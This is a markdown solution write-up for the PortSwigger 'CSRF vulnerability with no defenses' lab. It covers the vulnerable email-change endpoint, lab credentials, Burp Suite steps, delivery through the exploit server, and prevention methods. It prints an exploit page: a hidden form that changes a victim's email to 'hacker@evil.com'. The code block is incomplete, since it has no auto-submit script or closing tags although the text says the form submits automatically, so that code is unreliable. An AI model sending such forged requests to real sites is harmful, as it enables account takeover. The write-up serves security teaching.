Add solution for CSRF vulnerability with no defenses
# Lab: CSRF Vulnerability with No Defenses

**Difficulty:** Apprentice  
**Category:** Cross-Site Request Forgery (CSRF)  
**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf/lab-no-defenses)

## 🎯 Objective
Change the email address of the victim user by exploiting a CSRF vulnerability in the email change functionality.

## 📖 Description
This lab's email change feature is completely unprotected against CSRF attacks. There are no anti-CSRF tokens, SameSite cookies, Referer validation, or any other defenses.

## 🔍 Vulnerability Analysis

- **Vulnerable Endpoint**: `POST /my-account/change-email`
- **Parameters**: `email`
- **Weakness**: The application trusts any request containing a valid session cookie without verifying the origin of the request.

## 🛠️ How to Solve (Step by Step)

1. Log in to the lab using credentials: `wiener:peter`
2. Navigate to "My account" and submit an email change request to capture the request in Burp Suite Proxy.
3. Create a malicious HTML page that automatically submits the email change on behalf of the victim.
4. Host the exploit on the Exploit Server and deliver it to the victim.

## 💥 Exploit Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit - Email Change</title>
</head>
<body>
    <h1>Updating your account...</h1>
    
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>
```



##🚀 Delivery Steps

Go to the Exploit Server.
Paste the HTML code in the Body section.
Click Deliver exploit to victim.
The lab is solved when the victim's email address has been changed.

⚡ Impact

Full account takeover is possible.
The attacker can change the victim's email and perform password reset to take over the account.

🛡️ Prevention Methods

Implement CSRF tokens (unique per session and tied to the user).
Set proper SameSite=Lax or Strict attributes on session cookies.
Validate Referer or Origin headers.
Use built-in CSRF protection from modern web frameworks.

🔬 Key Learning Points

CSRF occurs when an application cannot distinguish between legitimate and forged requests.
Even simple form submissions can be dangerous if not protected.
Auto-submitting forms via JavaScript is a common CSRF delivery technique.
